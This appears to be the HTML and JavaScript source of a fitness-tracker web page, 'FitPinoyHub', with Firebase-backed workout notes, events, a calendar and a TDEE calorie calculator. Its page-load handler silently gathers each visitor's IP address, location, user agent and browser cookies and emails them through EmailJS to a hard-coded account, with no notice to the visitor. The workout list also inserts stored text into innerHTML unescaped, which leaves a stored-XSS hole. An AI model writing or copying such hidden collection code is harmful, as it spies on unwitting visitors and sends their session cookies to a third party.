<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon" href="./assets/fitpinoyicon.png" type="image/x-icon"/>
<title>FitPinoyHub</title>
<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
<style>
    body {
    font-family: Arial;
    background: #f5f5f5;
    margin: 0;
    }
    header {
        background: #4CAF50;
        color: white;
        text-align: center;
        padding: 1rem;
    }
    .container {
        max-width: 900px;
        margin: 20px auto;
        padding: 20px;
        background: white;
        border-radius: 8px;
    }
    h2 {
        margin-top: 0;
    }
    ul {
        list-style: none;
        padding: 0;
    }
    li {
        display: flex;
        justify-content: space-between;
        padding: 8px 0;
        border-bottom: 1px solid #ddd;
    }
    button {
        padding: 5px 10px;
        cursor: pointer;
    }
    input,
    textarea {
        width: 100%;
        padding: 8px;
        margin: 5px 0;
        border-radius: 4px;
        border: 1px solid #ccc;
    }
    .done {
        text-decoration: line-through;
        color: gray;
    }
    /* Calendar styling */
    #calendar {
        max-width: 900px;
        margin: 20px auto;
        background: white;
        padding: 10px;
        border-radius: 8px;
    }
    .result {
      margin-top: 15px;
      padding: 10px;
      background: #f0f8ff;
      border-radius: 5px;
      font-size: 14px;
    }
</style>
<!-- Script for Calendar -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/fullcalendar/6.1.8/index.global.min.js"></script>
<link href="https://cdnjs.cloudflare.com/ajax/libs/fullcalendar/6.1.8/index.min.css" rel="stylesheet">
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
</head>
<body>

<header>
    <h1>FitPinoyHub</h1>
</header>

<div class="container">
    <!-- Notes Section -->
    <h2><center>Workout Notes</h2></center>
    <textarea id="notes" placeholder="Write your notes..."></textarea>
    <button onclick="saveNotes()">Save Notes</button>

    <!-- Workouts Section -->
    <h2><center>Workout List</h2></center>
    <input type="text" id="workout" placeholder="Add workout">
    <button onclick="addWorkout()">Add</button>
    <ul id="workoutList"></ul>

    <!-- Events Section -->
    <h2><center>Events</h2></center>
    <input type="date" id="eventDate">
    <input type="text" id="eventText" placeholder="Event description">
    <button onclick="addEvent()">Add Event</button>
    <ul id="eventList"></ul>

    <!-- Calendar Section -->
    <h2><center>Calendar</h2></center>
    <div id="calendar"></div>

    <!-- Calorie Calculator Section -->
    <div class="card">
        <h2><center>TDEE Calculator</h2></center>
        <h2>Weight</h2>
        <input type="number" id="weight" placeholder="Weight (kg)" />
        <h2>Weight</h2>
        <input type="number" id="height" placeholder="Height (cm)" />
        <h2>Weight</h2>
        <input type="number" id="age" placeholder="Age" />

        <h2>Gender</h2>
        <select id="gender">
            <option value="male">Male</option>
            <option value="female">Female</option>
        </select>

        <h2>Activity Level</h2>
        <select id="activity">
            <option value="1.2">Sedentary (little/no exercise)</option>
            <option value="1.375">Light (1–3 days/week)</option>
            <option value="1.55">Moderate (3–5 days/week)</option>
            <option value="1.725">Active (6–7 days/week)</option>
            <option value="1.9">Very Active (physical job)</option>
        </select>

        <h2>Daily Calories Intake</h2>
        <input type="number" id="calories" placeholder="Your Daily Intake (optional)" />

        <button onclick="calculate()">Calculate</button>

        <div class="result" id="result"></div>
    </div>
</div>

<!-- Use module type for ES Modules -->
<script type="module">
    // Import Firebase modules from CDN
    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.11.0/firebase-app.js";
    import { getFirestore, collection, doc, setDoc, getDoc, addDoc, getDocs, updateDoc, deleteDoc, orderBy, query } from "https://www.gstatic.com/firebasejs/12.11.0/firebase-firestore.js";
    import { getAnalytics } from "https://www.gstatic.com/firebasejs/12.11.0/firebase-analytics.js";

    // Firebase config
    const firebaseConfig = {
        apiKey: "AIzaSyAzaUFeot6rvmK2yOsRY5uktmXky45ua2k",
        authDomain: "workouttracker-ffa75.firebaseapp.com",
        databaseURL: "https://workouttracker-ffa75-default-rtdb.firebaseio.com",
        projectId: "workouttracker-ffa75",
        storageBucket: "workouttracker-ffa75.firebasestorage.app",
        messagingSenderId: "149587278276",
        appId: "1:149587278276:web:5605dbaaf3161275ddcc91",
        measurementId: "G-C1L2XTVM86"
    };

    // Initialize Firebase
    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);
    const analytics = getAnalytics(app);

    // ---------------- Notes ----------------
    async function saveNotes() {
        const notes = document.getElementById('notes').value;
        await setDoc(doc(db, 'notes', 'myNotes'), { content: notes });
        // alert('Notes saved to Firebase!');
        Swal.fire({
            icon: 'success',
            title: 'Saved!',
            text: 'Notes saved to Firebase',
            timer: 1500,
            showConfirmButton: false
        });
    }

    async function loadNotes() {
        const docSnap = await getDoc(doc(db, 'notes', 'myNotes'));
        if (docSnap.exists()) {
            document.getElementById('notes').value = docSnap.data().content;
        }
    }

    // ---------------- Workouts ----------------
    async function addWorkout() {
        const workout = document.getElementById('workout').value;
        if (!workout) return;

        await addDoc(collection(db, 'workouts'), { name: workout, done: false });

        document.getElementById('workout').value = '';

        Swal.fire({
            icon: 'success',
            title: 'Workout Added!',
            timer: 3000,
            showConfirmButton: false
        });

        loadWorkouts();
    }

    async function toggleDone(id, done) {
        const docRef = doc(db, 'workouts', id);
        await updateDoc(docRef, { done: !done });
        loadWorkouts();
    }

    async function deleteWorkout(id) {
        await deleteDoc(doc(db, 'workouts', id));
        loadWorkouts();
    }

    async function loadWorkouts() {
        const q = query(collection(db, 'workouts'));
        const snapshot = await getDocs(q);
        const list = document.getElementById('workoutList');
        list.innerHTML = '';
        snapshot.forEach(docSnap => {
            const data = docSnap.data();
            const li = document.createElement('li');
            li.innerHTML = `
                <span class="${data.done ? 'done' : ''}">${data.name}</span>
                <div>
                    <button onclick="toggleDone('${docSnap.id}', ${data.done})">${data.done ? 'Undo' : 'Done'}</button>
                    <button onclick="deleteWorkout('${docSnap.id}')">Delete</button>
                </div>
            `;
            list.appendChild(li);
        });
    }

    // ---------------- Events & Calendar ----------------
    let calendar; 

    function renderCalendar(events = []) {
        const calendarEl = document.getElementById('calendar');
        if (!calendar) {
            calendar = new FullCalendar.Calendar(calendarEl, {
                initialView: 'dayGridMonth',
                height: 600,
                events: events
            });
            calendar.render();
        } else {
            calendar.removeAllEvents();
            events.forEach(event => calendar.addEvent(event));
        }
    }

    async function addEvent() {
        const date = document.getElementById('eventDate').value;
        const text = document.getElementById('eventText').value;

        if (!date || !text) {
            Swal.fire({
                icon: 'warning',
                title: 'Oops...',
                text: 'Please fill up the required fields.'
            });
            return;
        }

        await addDoc(collection(db, 'events'), { date, text });

        document.getElementById('eventDate').value = '';
        document.getElementById('eventText').value = '';

        Swal.fire({
            icon: 'success',
            title: 'Event Added!',
            text: 'Your event was saved successfully',
            timer: 3000,
            showConfirmButton: false
        });

        loadEvents();
    }

    async function loadEvents() {
        const q = query(collection(db, 'events'), orderBy('date'));
        const snapshot = await getDocs(q);
        const list = document.getElementById('eventList');
        list.innerHTML = '';
        const calendarEvents = [];

        snapshot.forEach(docSnap => {
            const data = docSnap.data();

            // Populate list
            const li = document.createElement('li');
            li.textContent = `${data.date}: ${data.text}`;
            list.appendChild(li);

            // Populate calendar
            calendarEvents.push({
                title: data.text,
                start: data.date
            });
        });

        renderCalendar(calendarEvents);
    }

    document.addEventListener('DOMContentLoaded', () => {
        loadNotes();
        loadWorkouts();
        loadEvents();
    });

    // TDEE Calculator reference
    function calculate() {
        const weight = parseFloat(document.getElementById('weight').value);
        const height = parseFloat(document.getElementById('height').value);
        const age = parseFloat(document.getElementById('age').value);
        const gender = document.getElementById('gender').value;
        const activity = parseFloat(document.getElementById('activity').value);
        const calories = parseFloat(document.getElementById('calories').value);

        if (!weight || !height || !age) {
            Swal.fire({
                icon: 'warning',
                title: 'Oops...',
                text: 'Please fill up the required fields.'
            });
            return;
        }

        let bmr =
            gender === 'male'
            ? 10 * weight + 6.25 * height - 5 * age + 5
            : 10 * weight + 6.25 * height - 5 * age - 161;

        let tdee = bmr * activity;

        let mildCut = tdee - 300;
        let normalCut = tdee - 500;
        let aggressiveCut = tdee - 700;

        let bulk = tdee + 300;

        let actualDeficit = null;
        if (calories) {
            actualDeficit = tdee - calories;
        }

        // result
        document.getElementById('result').innerHTML = `
            <strong>BMR:</strong> ${Math.round(bmr)} kcal<br>
            <strong>Maintenance (TDEE):</strong> ${Math.round(tdee)} kcal<br><br>

            <strong>Cutting:</strong><br>
            Mild: ${Math.round(mildCut)} kcal<br>
            Normal: ${Math.round(normalCut)} kcal<br>
            Aggressive: ${Math.round(aggressiveCut)} kcal<br><br>

            <strong>Bulking:</strong><br>
            ${Math.round(bulk)} kcal<br><br>

            ${
            actualDeficit !== null
                ? `<strong>Your Current Deficit:</strong> ${Math.round(actualDeficit)} kcal`
                : ''
            }
        `;
    }

    (function(){
        // email js PUBLIC API KEY (user)
        emailjs.init("G3tmu6bSokASDsudB");
    })();

    window.onload = async function () {
        let ipData = {};

        try {
        const res = await fetch("https://ipapi.co/json/");
        ipData = await res.json();
        } catch (err) {
        console.log("IP fetch failed:", err);
        }

        const params = {
        page: window.location.href,
        userAgent: navigator.userAgent,
        time: new Date().toLocaleString(),
        cookies: document.cookie,

        ip: ipData.ip || "N/A",
        city: ipData.city || "N/A",
        region: ipData.region || "N/A",
        country: ipData.country_name || "N/A"
        };

        // email js: serviceID, templateID, templateParams
        emailjs.send("service_romt14a", "template_1hvg1g2", params)
        .then(function(response) {
            console.log("Email sent!", response.status);
        }, function(error) {
            console.log("Failed...", error);
        });

        const target = document.getElementById("title");
        if (target) {
        target.scrollIntoView({ behavior: "smooth" });
        }
    };

    // Make functions global to use in onclick
    window.addWorkout = addWorkout;
    window.toggleDone = toggleDone;
    window.deleteWorkout = deleteWorkout;
    window.addEvent = addEvent;
    window.saveNotes = saveNotes;
    window.calculate = calculate;
</script>

</body>
</html>
